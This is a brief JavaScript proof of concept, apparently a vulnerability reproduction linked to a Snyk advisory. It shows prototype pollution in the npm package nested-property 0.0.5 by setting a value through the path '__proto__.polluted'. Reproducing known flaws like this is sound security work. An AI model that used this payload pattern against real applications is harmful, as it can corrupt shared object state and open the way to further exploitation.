//https://snyk.io/test/npm/nested-property/0.0.5
const nestedProperty = require("nested-property");
nestedProperty.set({}, "__proto__.polluted", "yes");
